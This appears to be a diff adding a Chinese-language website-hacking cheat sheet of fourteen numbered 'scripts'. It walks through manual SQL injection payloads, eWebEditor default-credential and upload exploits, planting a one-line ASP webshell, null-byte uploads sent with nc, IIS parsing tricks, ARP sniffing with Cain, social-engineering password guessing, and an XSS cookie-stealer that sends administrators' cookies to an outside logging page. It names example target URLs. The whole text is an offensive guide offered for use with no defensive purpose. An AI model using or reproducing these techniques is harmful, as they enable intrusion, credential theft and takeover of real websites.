@@ -1,0 +1,110 @@
+                                                                                    脚本一
+      找到注入点以后，先用明小子或者啊D扫后台，找到后台后再猜解用户名和MD5加密的密码，MD5解密可以到www.cmd5.com等网站去解密。
+      得到解密后的密码后，进后台，然后就是找有没有数据库备份，有数据库备份则上传图片格式的小马，然后数据库备份。如果没有数据库备份则抓包，得到上传路径和cookie，然后用明小子的综合上传——动力上传漏洞——图片上传，上传小马。                                                                                        
+                                                                                      脚本二
+    ewebeditor编辑器漏 
+    默认后台地址：/ewebeditor/admin_login.asp 
+    默认密码：admin，admin；admin，admin888
+    默认样式设计路径：/ewebeditor/admin_style.asp
+    默认数据库路径：/db/ewebeditor.mdb
+    进入编辑器后,进入样式管理:
+    1.路径模式->绝对根路径
+    2.图片类型->asa
+    3.提交后点击设置此样式下的工具栏,点击新增工具栏->可选按钮中选择插入或修改图片->保存设置
+     4.点击返回样式管理->预览->上传图片->上传成功后选择(代码)
+      当数据库为只读,新增样式失败，然后利用http://网址/ewebeditor/admin_uoloadfile.asp？id=14&dir=.. (dir为列目录,..为返回上层目录),形式:dir ../.. 进入网站目录后下载数据库
+   当MD5破解不了,可以试着去下载数据库,也可以在ewebsditor_style中查看是否有前人留下的东西,然后记下id和s_name.
+例如id=48,s_name=asdasd,则构造成ewebeditor.asp?id=48&style=asdasd
+  然后在浏览器中输入:http://网址/ewebeditor/ewebeditor.asp?id=48&style=asdasd,然后上传asa的小马.
+                                                                              脚本三
+     当用啊D和明小子发现注入点为DB权限时,可以用穿山甲看一下是否为sa权限,如果为sa权限时,则可以直接用穿山甲的CMD命令提权.
+     如果工具扫不到注入点,但用手动检测发现防注程序,则用注入中转.
+    在注入中转生成器中选择"cookie注入",然在"注入URL地址"中输入注入点"?id="前的网址,例如:http://www.lsfff.com/newshouse/show.asp
+     注入键名中输入例:id=,POST提交值:imdcw=中输入id值,例imdcw=40,然后将生成的网页放入搭建环境中.
+  接着DB权限列目录:在穿山甲的文件管理,然后逐步列举找网站目录找到网站目录后,在浏览器中输入目录中的一个页面来验证找到的是否为网站目录.
+       找到正确的网站目录后,用Getwebshell软件得到一句话木马.在Getwebshell的路径应为网站目录.例:\freehost\lsfffcom\web\db.asp.在地址中写注入地址,代码:<%exexute(request("a"))%>中a为一句话木马密码.在Getwebshell中逐步完成后,用一句话木马客户端上传木马.
+脚本四
+   在注入中转后,放在本机建的网站环境中,然后用明小子,啊D或着穿山甲来猜表,得到用户名和密码，工具栏中输入 http://127.0.0.1/...
+  防注入程序可能值过滤and ; ' ,不过滤or,xor,select,且可能不过滤大小写转换后的值.
+                                                                             脚本五
+   旁注:从旁注入,当工具扫不到注入点,或者进不了网站的后台,则可以用旁注.
+旁注可以用明小子,在旁注检测中输入域名,然后点">>",得到IP,然后再查询该IP上所有网站,查询到所有网站以后,点击SQL注入,然后批量扫描注入点->载入查询网址->批量分析注入点
+  如果工具查找不到后台,可以用谷歌和百度来搜索,各格式为site:网址 intitle:后台/管理
+  进入webshell后,测试网站是否支持aspx,因为aspx的权限更大,容易提权.如果aspx大马上传失败,可以用aspx的测试文件,替换其中的内容.
+脚本六
+   手工注入asp:
+   加',返回错误也面
+   and 1=1,返回正常页面     
+   and 1=2,返回错误页面
+   and exists (select * from admin) 猜数据库中有无admin表段,返回正常页面则表明有admin这个表.
+      order by 数字 猜字段数,数字不断增加,直到返回错误页面前的数字就是字段数.
+      and 1=2 union select 1,2,3,4,5,...,n(n为字段数) from admin (admin为已有表段)
+      然后就是猜用户名和密码,例username,password.一般将username和password替换上一页面显示数字的地方.
+   例:and 1=2 union select 1,2,username,4,5,password,7,...,n from admin
+     当得到用户名和密码,进入后台后,如找不到数据库备份,使用上传时,提示图片小马上传成功时,要注意上传地址,如果写着是"首页图片新闻图片地址",则到网站首页,选择一个首页图片单击属性,得到文件路径.
+     如果上传不成功,则抓包,如果抓包也失败,则在后台源代码找一下是否为ewebeditor编辑器,通过ewebeditor常见漏洞上传.
+     如果网址过滤 and 1=1 1=2 ',则用xor,xor 1=1 返回错误;xor 1=2 返回正常.
+                                                                            脚本七
+   手工注入PHP:
+      用order by 数字,猜字段数,如果数字到了1还报错,则直接猜字段.用and 1=2 union select 1,2,3,...,n,直到n返回正确页面.
+     version() 查看版本,用法:替换数字.
+     user() 查看权限,用法:替换数字.
+   如果显示root权限,则可以用loadfile()函数
+       然后则是猜表名,用到table_name和information_schma.tables
+   用法:and 1=2 union select 1,2,table_name,4,5,...,n from information_schema.tables
+   然后网页会列出所有表名,接着就是寻找敏感的表名.
+      猜列名和猜表名差不多,用到column_name和information.colums
+   用法:and 1=2 union select 1,2,colum_name,4,5,...,n from information_schema.columns
+      得到用户名和密码字段后,就构造语句查询其内容
+   用法:and 1=2 union select 1,2,用户名,密码,...,n from 表名
+                                                                            脚本八
+       一句话木马利用
+       如果后台的上传都不可用,但是用数据库备份,这个时候就可以用转换过的一句话木马.
+       到网站查找是否有留言的地方,在留言处全部填写转换过的一句话木马,提交后到网站后台备份一下,备份成asp文件,这样一句话木马就写上去了.
+       然后用一句话怒那客户端上传大马,注意一定要改一下上传后大马的文件名,不然可能文件名冲突某些不上大马.得到大马文件名的方法就是数据库备份一个新的asp文件.
+                                                                               脚本九  
+    cain嗅探的方法
+      先一直下一步安装cain,安装完成后打开cain,点击Sniffer->Configure(配置)->选择要嗅探的IP,端口->应用->开始->右键空白处-<第一个(Scan Mac Address)->空白处单击->灰色加号变蓝->单击加号->在左边显示IP处选择点击后右边空白处会出现要嗅探的那个IP->Start/Stop APR
+      接着Cain就会嗅探这个IP的一举一动,因此可以得到帐号和密码
+                                                                                 脚本十
+     简单社工拿站
+      首先在目标网站上找到有用的信息,例如:电话,QQ,网址,邮箱
+      一般想得到密码,可以先选择找回密码,而找回密码一般都是通过邮箱找回,因此首要目标就是得到目标网站的提供的邮箱的帐号和密码.
+      邮箱常见帐号为域名,目标名称,或者QQ号,手机号,密码也是如此.如果无法猜解到密码,则通过找回密码,根据密保问题的回答来得到新密码.
+脚本十一
+       跨站的利用
+       在网站留言或者能输入信息的地方提交跨站代码,从而盗取管理员cookie,然后用cookie浏览器直接登录后台。
+        将以下代码保存为asp文件，例如fengshen.asp
+    <%
+    thisfile=Server.MapPath("cookie.txt")
+    msg=Request("msg")
+    set fs = server.CreateObject("scripting.filesystemobject")
+    set thisfile = fs.OpenTextFile(thisfile,8,Ture,0)
+    thisfile.WriteLine("====cookie:"&msg&"====by 风神")
+    thisfile.close
+    set fs =nothing
+    %>
+    这段代码的意思就是在法国fengshen.asp文件同目录下生成一个cookie.txt,该cookie.txt包含管理员的cookie信息。
+    要使上面的代码发挥功效，则要将fengshen.asp放在一个能下载的环境下，然后在留言的网站地址上写<script>doucument.location='http://下载地址/fengshen.asp?msg='document.cookie</script>
+    当管理员通过审核留言后，则生成一个cookie.txt，所在地址为http://下载地址/cookie.txt
+                                                                         脚本十二
+    site：网站 filetype:asp/aspx/php/jsp  查看脚本类型
+    如果网站没有任何已知漏洞，且旁注也失败，那则用工具查看是否有FTP，从FTP简单才接**。常用密码可能为 域名 123456 111111 666666 888888 域名123 域名888
+                                                                          脚本十三
+    绕过后台验证进后台：
+    有时候进后台网页的时候，会提示先登陆，现在有多重方法绕过验证
+    一.提高IE安全等级，将IE等级调到最高，可以将全部弹窗禁止，从而直接进入后台
+    二.在弹出登陆提示页面，查看源代码，将弹出弹框的语句删除，并注意在代码中加上网站网址，不然不会跳转。
+    三.直接用拦截弹框的浏览器查看
+    NC拿shell
+    1.将小马的抓包信息复制到文本文件中。
+    2.在抓包信息中name="filepath"下的路径填写小马名称，例../UploadFiles/1.asp  (在1.asp后面有空格)
+    3.在Content-Length处加上uploadFile/后增加的字节数
+    4.用C32将空格的20改为00，保存为1.txt
+    5.然后用批处理文件上传，批处理命令： nc 网址 80<1.txt
+    如果上传成功后，没有将小马解析成asp，可以试一下将文件名改成asa,cer,如果都不行，则用IIS的解析漏洞，将文件名改为1.asa;1.jpg,应注意dos提示的上传路径，一般路径应为：../uploadfiles/1.asa;1.jpg201059...9.gif,因此输入网址时，应输入网站路径，但IIS只会解析asa前面的内容。
+                                                                              脚本十四
+     当后台没有数据库备份，可以用明小子扫一下后台，可能会数据库备份的网页，当找到数据库备份，但不能改文件名称和类型时，可以查看网页源代码，并复制下来，并加以修改：
+      1.POST处补全网址
+      2.当前路径，修改成上传的图片木马路径
+      3.备份名称修改成asp格式的
